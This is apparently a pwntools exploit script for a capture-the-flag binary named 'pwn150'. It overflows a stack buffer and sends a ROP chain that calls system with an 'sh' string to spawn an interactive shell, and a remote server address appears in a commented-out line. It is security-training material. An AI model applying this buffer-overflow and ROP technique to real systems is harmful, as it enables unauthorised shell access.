from os import lseek
from pwn import *

context(log_level = "Debug", arch = "amd64", os = "Linux")
io = process("./pwn150")
e = ELF("./pwn150")
# io = remote("114.55.66.54", 10001)
gdb.attach(io)

system_addr = e.sym["system"]
log.info("system address is " + hex(system_addr))
pop_rdi = 0x400883
sh_addr = 0x4003EF

payload = "A" * 0x58
payload += p64(pop_rdi)
payload += p64(sh_addr)
payload += p64(0x400881)
payload += p64(0) + p64(0)
payload += p64(system_addr)

io.recvuntil("here:")
io.sendline(payload)
io.recv()
io.interactive()